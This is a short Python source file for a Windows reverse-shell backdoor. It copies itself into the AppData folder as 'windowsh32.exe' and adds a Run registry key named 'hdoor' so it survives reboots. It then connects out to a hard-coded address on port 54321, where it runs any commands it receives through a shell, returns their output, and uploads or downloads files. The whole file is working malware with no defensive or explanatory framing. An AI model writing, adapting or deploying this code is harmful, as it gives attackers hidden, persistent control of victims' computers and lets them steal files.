#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time

def send_data(data):
	json_data = json.dumps(data)
	sock.send(json_data)

def recv_data():
	data=""
	while True:
		try:
			data = data + sock.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.43.26",54321))
			shell()
		except:
			connection()

def shell():
	while True:
		cmd = recv_data()
		if cmd=='q':
			connection()
		elif cmd[:2] == "cd":
			try:
				os.chdir(cmd[3:])
			except:
				continue
		elif cmd[:8]=="download":
                        with open(cmd[9:],"rb") as file:
                                send_data(base64.b64encode(file.read()))
                elif cmd[:6]=="upload":
                	with open(cmd[7:],"wb") as fin:
				file_data = recv_data()
				fin.write(base64.b64decode(file_data))
		else:
			proc = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			res = proc.stdout.read() + proc.stderr.read()
			send_data(res)


loc = os.environ["appdata"] + "\\windowsh32.exe"
if not os.path.exists(loc):
	shutil.copyfile(sys.executable,loc)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v hdoor /t REG_SZ /d "' + loc + '"',shell=True)




time.sleep(20)
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection()
sock.close()
